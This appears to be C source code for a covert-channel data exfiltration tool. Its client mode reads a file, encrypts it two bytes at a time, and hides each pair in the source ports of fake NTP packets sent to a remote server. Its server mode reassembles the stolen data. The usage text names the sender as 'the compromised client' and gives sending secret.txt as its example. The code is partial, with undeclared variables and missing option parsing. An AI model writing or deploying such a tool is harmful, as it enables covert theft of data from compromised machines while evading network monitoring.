#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#include "covert.h"
#include "crypto.h"
#include "inet.h"
#include "ntp.h"

#define SLEEP_TIME 100000

int main(int argc, char **argv)
{
	char buffer[MAX_LEN];
	char *pbuf;
	uint buflen;
	

	uint32 dest = resolve(argv[optind]); 

	file = open_file(fname, isClient);

	if (isClient)
	{
		while ((buflen = fread(buffer, 1, BUF_SIZ, file)) > 0)
		{
			pbuf = buffer;

			// Pad non-even sequences with a space ...
			if (buflen % 2 != 0)
			{
				buffer[buflen - 1] = ' ';
				buffer[buflen] = 0;
				++buflen;
			}
		
			for (int i = 0; i < buflen;)
			{
				char *enc;
				ushort src_port = 0;
				ushort dst_port = 0;

				enc = encrypt(SEKRET_KEY, pbuf, 2);
				src_port = (enc[0] << 8) + enc[1];
				dst_port = PORT_NTP;
				free(enc);

				_send(dest, src_port, dst_port, TRUE);

				i += 2;
				pbuf += 2;
				usleep(SLEEP_TIME);
			}
		}
	}
	else
	{
		srv_recv(dest, file, keepPort);
	}
}

FILE* open_file(char* fname, uint8 isClient)
{
	FILE *file;

	if (isClient)
	{
		if (strcmp(fname, "-") == 0)
			file = stdin;
		else
		{
			if ( (file = fopen(fname, "r")) == NULL)
				error("Error opening open input file.");
		}
	}
	else
	{
		if (strcmp(fname, "-") == 0)
			file = stdout;
		else
		{
			if ( (file = fopen(fname, "w")) == NULL)
				error("Error opening open ouput file.");
		}
	}

	return file;
}

void usage(char *name)
{
	printf("Usage: [options] [remote host]%s\n", name);
	printf(" In server mode, remote host is the compromised client.\n");
	printf(" In client mode, remote host is the server to send to.\n");
	printf(" -c: Use client mode.\n");
	printf(" -s: Use server mode.\n");
	printf(" -p: Send responses to the same port the request came from.\n");
	printf(" -f {filename}: Set input/output file, - for STDIN/STDOUT.\n");
	printf(" DEFAULTS: -c -f -\n");
	printf(" EXAMPLE: %s -c -f secret.txt -p 10.0.128.1\n", name);

	exit(0);
}
